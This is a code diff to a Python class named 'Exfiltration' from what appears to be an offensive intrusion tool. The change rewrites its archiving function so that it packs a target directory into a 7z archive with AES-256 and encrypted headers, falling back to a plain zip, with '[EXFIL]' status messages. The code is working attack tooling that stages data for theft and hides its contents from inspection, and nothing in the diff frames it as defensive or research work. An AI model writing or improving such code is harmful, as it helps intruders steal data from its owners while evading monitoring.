@@ -52,15 +52,26 @@ class Exfiltration:
 
     @staticmethod
     def encrypt_archive(dir_path, password, on_output=None):
-        """Create a password-protected zip for exfiltration."""
-        import zipfile
-        out_zip = f"{dir_path}.zip"
+        """Create a password-protected archive for exfiltration."""
+        import subprocess
+        out_zip = f"{dir_path}.7z"
         if on_output: on_output(f"[EXFIL] ARCHIVING_{dir_path}_WITH_AES_ENCRYPTION...")
-        
-        # Using standard zip for portability, though not as strong as 7z
-        with zipfile.ZipFile(out_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
-            for root, dirs, files in os.walk(dir_path):
-                for f in files:
-                    zf.write(os.path.join(root, f), os.path.relpath(os.path.join(root, f), dir_path))
-        
-        return out_zip
+
+        # Use 7z for real AES-256 encryption (standard zipfile has no encryption)
+        try:
+            subprocess.check_call([
+                "7z", "a", "-t7z", "-mhe=on", f"-p{password}",
+                out_zip, dir_path
+            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            if on_output: on_output(f"[EXFIL] ENCRYPTED_ARCHIVE_CREATED: {out_zip}")
+            return out_zip
+        except (FileNotFoundError, subprocess.CalledProcessError):
+            # Fallback: standard zip without encryption
+            import zipfile
+            out_zip = f"{dir_path}.zip"
+            if on_output: on_output("[EXFIL] WARNING: 7z not found, falling back to unencrypted zip")
+            with zipfile.ZipFile(out_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
+                for root, dirs, files in os.walk(dir_path):
+                    for f in files:
+                        zf.write(os.path.join(root, f), os.path.relpath(os.path.join(root, f), dir_path))
+            return out_zip
